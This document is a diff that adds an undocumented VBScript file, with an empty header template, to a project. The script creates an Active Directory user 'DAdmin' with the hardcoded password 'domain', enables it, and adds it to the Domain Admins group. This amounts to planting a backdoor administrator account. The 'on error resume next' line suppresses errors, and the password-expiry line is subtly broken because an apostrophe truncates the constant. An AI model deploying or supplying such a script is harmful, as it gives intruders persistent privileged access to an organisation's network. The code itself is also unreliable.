@@ -1,0 +1,48 @@
+###
+###
+###
+### Category1 : 
+### Category2 : 
+### Category3 : 
+### Description : 
+###
+###
+###
+on error resume next
+dim rootDSE
+set rootDSE = GetObject("LDAP://RootDSE")
+domainname=rootDSE.Get("defaultnamingcontext")
+
+	usrName = "DAdmin" 
+	usrName2 = "DAdmin"
+	Set domain = GetObject("LDAP://" & domainname)
+	set ou = domain.GetObject("container", "CN=Users" )
+
+	set usr = ou.Create("user", "cn=" & usrName )
+	usr.Put "samAccountName", usrName2
+	usr.SetInfo
+
+	set usr = GetObject("LDAP:// CN=" & usrName & ", CN=Users, "  & domainname)
+
+
+	usr.AccountDisabled = FALSE
+
+
+	usr.SetPassword "domain"
+
+
+	flag = usr.Get("UserAccountControl")
+	newFlag = flag Or UF_DON'T_EXPIRE_PASSWD
+	usr.Put "userAccountControl", newFlag
+
+
+	usr.Put "pwdLastSet", CLng(-1)
+	usr.SetInfo
+
+
+set domain = GetObject("LDAP://" & domainname)
+	set ou2 = domain.GetObject("container", "CN=Users" )
+	set grp = ou2.GetObject("group", "CN=Domain Admins" )
+	set usr = ou2.GetObject("user", "CN= "  & usrName)
+	grp.Add usr.AdsPath
+
